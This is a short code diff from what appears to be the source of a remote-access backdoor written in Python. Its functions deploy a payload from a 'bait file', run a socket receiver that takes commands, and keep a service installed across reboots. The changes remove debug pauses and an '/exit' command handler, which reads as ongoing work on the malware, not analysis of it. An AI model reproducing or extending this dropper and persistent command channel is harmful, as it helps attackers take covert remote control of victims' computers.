@@ -238,8 +238,7 @@ def deploy_payload():
         )
 
         log("[Stage 1: Complete - Exiting bait file]")
-        dev_pause()
-        sys.exit(0)  # Success
+        sys.exit(0)  # Success - no pause needed
 
     except Exception as e:
         log(f"[Stage 1: Failed - {e}]")
@@ -457,21 +456,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
 
                             # Exit completely (don't reconnect)
                             log("Service uninstalled. Exiting.")
-                            dev_pause()
-                            sys.exit(0)
-
-                        elif command.strip().lower() == "/exit":
-                            log("Received /exit command - exiting without uninstalling...")
-
-                            # Send acknowledgment
-                            msg = "\n[Exiting session (service will remain installed)...]\n"
-                            client_socket.sendall(msg.encode("utf-8"))
-                            client_socket.sendall(END_MARKER)
-
-                            # Exit without uninstalling (will restart on next boot)
-                            log("Exiting. Service remains installed.")
-                            dev_pause()
-                            sys.exit(0)
+                            sys.exit(0)  # Intentional exit - no pause needed
 
                         log(f"$ {command}")
 
@@ -503,8 +488,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
             sys.exit(1)  # Non-zero exit triggers service restart
         else:
             log("\n\nExiting...")
-            dev_pause()
-            sys.exit(0)  # Clean exit on macOS/Linux
+            sys.exit(0)  # Clean exit on macOS/Linux - no pause needed
     except Exception as e:
         log(f"Error: {e}")
         dev_pause()
